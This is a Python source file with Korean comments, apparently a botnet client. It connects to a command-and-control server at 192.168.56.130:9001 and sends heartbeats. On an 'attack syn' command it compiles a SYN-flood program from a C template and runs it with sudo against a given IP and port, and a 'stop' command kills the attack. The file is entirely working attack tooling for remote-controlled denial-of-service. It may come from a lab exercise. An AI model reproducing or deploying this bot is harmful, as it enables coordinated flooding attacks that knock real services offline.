import socket, threading, time, subprocess, os

CNC_IP = '192.168.56.130'   # 서버 IP에 맞게 변경
CNC_PORT = 9001

current_process = None  # 공격 서브프로세스 추적

def connect_to_cnc():
    global current_process

    while True:
        try:
            sock = socket.socket()
            sock.connect((CNC_IP, CNC_PORT))
            ip = sock.getsockname()[0]
            msg = f"hello {ip}\n"
            print(f"send: {msg.strip()}")
            sock.send(msg.encode())

            threading.Thread(target=heartbeat, args=(sock,), daemon=True).start()

            while True:
                data = sock.recv(1024).decode().strip()
                if data.startswith("attack"):
                    parts = data.split()
                    method = parts[1]
                    ip = parts[2]
                    port = parts[3]

                    # SYN Flood 공격 명령: attack syn <ip> <port>
                    if method == "syn" and len(parts) == 4:
                        with open("bot_attack.c", "w") as f:
                            f.write(get_c_source_code(method))
                        subprocess.run(["gcc", "bot_attack.c", "-o", "attack_exec"])
                        current_process = subprocess.Popen(["sudo", "./attack_exec", ip, port])
                    else:
                        with open("bot_attack.c", "w") as f:
                            f.write(get_c_source_code(method))
                        subprocess.run(["gcc", "bot_attack.c", "-o", "attack_exec"])
                        current_process = subprocess.Popen(["./attack_exec", ip, port])
                elif data == "stop":
                    if current_process:
                        current_process.terminate()
                        sock.send(b"done stop")
                        current_process = None

        except Exception as e:
            time.sleep(5)

def heartbeat(sock):
    while True:
        try:
            sock.send(b"heartbeat")
        except:
            break
        time.sleep(3)

def get_c_source_code(method):
    # syn 명령은 templates/syn_flood_loop.c 파일을 가져옴
    if method == "syn":
        return open("templates/syn_flood.c").read()
    return "// unknown attack"

if __name__ == "__main__":
    connect_to_cnc()
